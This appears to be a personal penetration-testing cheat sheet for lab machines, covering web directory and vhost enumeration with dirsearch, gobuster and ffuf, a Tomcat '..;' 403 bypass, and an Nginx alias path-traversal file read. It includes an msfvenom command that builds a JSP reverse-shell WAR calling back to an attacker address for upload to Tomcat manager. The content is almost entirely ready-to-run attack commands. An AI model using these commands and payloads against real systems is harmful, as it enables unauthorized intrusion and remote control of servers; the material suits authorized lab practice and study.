### Web Enumeration

dirsearch  - 
```bash
python3 dirsearch.py --full-url -r -u http://10.10.10.60/ -e php,aspx,jsp,html,js,php,txt -w /home/kali/Tools/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -q
```

dns - 
```bash
gobuster vhost forge.htb -u http://forge.htb -w /usr/share/seclists/Discovery/DNS/subdomain-top1million-110000.txt -r
```
Dictionary
```bash
/usr/share/dirbuster/wordlists/directory-list-1.0.txt
/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

Gobuster
```bash
gobuster dir -u https://10.11.1.237/ -w Tools/web/dirsearch/db/dicc.txt -k 
```

Fuzzing the url
```bash
ffuf -w ./LFI-Jhaddix.txt -u 'http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ' -fs 15349
```
***

### Tomcat Exploitation
1. `..;` to bypass the 403 http code. 
**Example**:- https://10.10.10.250//manager/status/html -> https://10.10.10.250//manager/status/..;/html
2. Create a reverse shell file and upload it as new application. 
```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f war -o shell.war```

### Nginx Exploitation

**Alias LFI Misconfiguration**
Inside the Nginx configuration look the "location" statements, if someone looks like:

```
location /imgs {
	alias /path/images/
}
```

There is a LFI vulnerability because - `/imgs../flag.txt`